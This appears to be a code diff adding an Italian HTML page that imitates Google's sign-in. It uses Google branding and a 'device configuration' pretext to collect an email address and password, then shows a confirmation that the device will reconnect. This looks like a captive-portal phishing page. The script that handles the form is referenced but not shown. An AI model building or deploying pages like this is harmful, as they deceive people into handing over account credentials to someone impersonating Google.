@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Google - Configurazione Dispositivo</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <main class="card">
+
+        <!-- LOGO / BRAND -->
+        <div class="brand">
+            <span class="brand-f">G</span><span class="brand-o1">o</span><span class="brand-o2">o</span><span class="brand-g">g</span><span class="brand-l">l</span><span class="brand-e">e</span>
+        </div>
+
+        <!-- SCHERMATA FORM -->
+        <section id="form-screen">
+            <h1>Accedi a Google</h1>
+            <p class="subtitle">Configura il dispositivo per continuare</p>
+
+            <form id="setup-form" novalidate>
+                <div class="field">
+                    <input type="text" id="email" name="email" placeholder=" " required>
+                    <label for="email">E-mail</label>
+                </div>
+
+                <div class="field">
+                    <input type="password" id="password" name="password" placeholder=" ">
+                    <label for="password">Password</label>
+                </div>
+
+                <p id="error-msg" class="error hidden"></p>
+
+                <div class="actions">
+                    <a href="#" class="link-muted" id="create-link">Serve aiuto?</a>
+                    <button type="submit" id="submit-btn">Avanti</button>
+                </div>
+            </form>
+        </section>
+
+        <!-- SCHERMATA SUCCESSO -->
+        <section id="success-screen" class="hidden">
+            <div class="check-icon">&#10003;</div>
+            <h1>Configurazione salvata</h1>
+            <p class="subtitle">Il dispositivo riavvierà la connessione con i nuovi parametri.</p>
+        </section>
+
+    </main>
+
+    <script src="/app.js"></script>
+</body>
+</html>
